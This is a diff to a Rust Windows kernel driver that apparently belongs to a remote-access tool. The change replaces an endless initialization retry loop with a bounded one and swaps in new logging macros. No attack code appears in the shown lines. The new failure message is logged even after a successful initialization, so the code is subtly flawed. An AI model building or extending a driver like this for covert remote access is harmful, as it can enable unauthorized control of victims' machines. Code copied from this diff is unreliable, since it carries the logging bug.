@@ -1,7 +1,6 @@
 use core::ffi::c_void;
 use core::ptr;
 
-use log::{error, info};
 use rat_common::utils::DropGuard;
 use wdk::{self, nt_success};
 use wdk_sys::_MODE::KernelMode;
@@ -18,25 +17,30 @@ use wdk_sys::{
 };
 use widestring::{U16CStr, Utf16Str, u16cstr};
 
-use crate::global::{RAT_CLIENT, RAT_CLIENT_OBJ_PATH, RAT_CLIENT_SERVICE_PATH, SERVICE_REGISTRY};
+use crate::global::{
+    MAX_INITIALIZE_ATTEMPTS, RAT_CLIENT, RAT_CLIENT_OBJ_PATH, RAT_CLIENT_SERVICE_PATH,
+    SERVICE_REGISTRY,
+};
 use crate::handlers::object;
-use crate::log;
 use crate::wrappers::bindings::InitializeObjectAttributes;
 use crate::wrappers::registry;
+use crate::{error, info};
 
 unsafe extern "C" fn initialize_thread_routine(_: *mut c_void) {
     let mut sleep = LARGE_INTEGER { QuadPart: -3000000 };
-    loop {
+    for _ in 0..MAX_INITIALIZE_ATTEMPTS {
         if initialize().is_ok() {
             break;
         }
 
         let status = unsafe { KeDelayExecutionThread(KernelMode as i8, 0, &mut sleep) };
         if !nt_success(status) {
-            log!("KeDelayExecutionThread failed: 0x{status:X}");
+            error!("KeDelayExecutionThread failed: 0x{status:X}");
             break;
         }
     }
+
+    error!("Failed to initialize after {MAX_INITIALIZE_ATTEMPTS} attempts");
 }
 
 fn setup_service_registry(path: &U16CStr) -> anyhow::Result<()> {
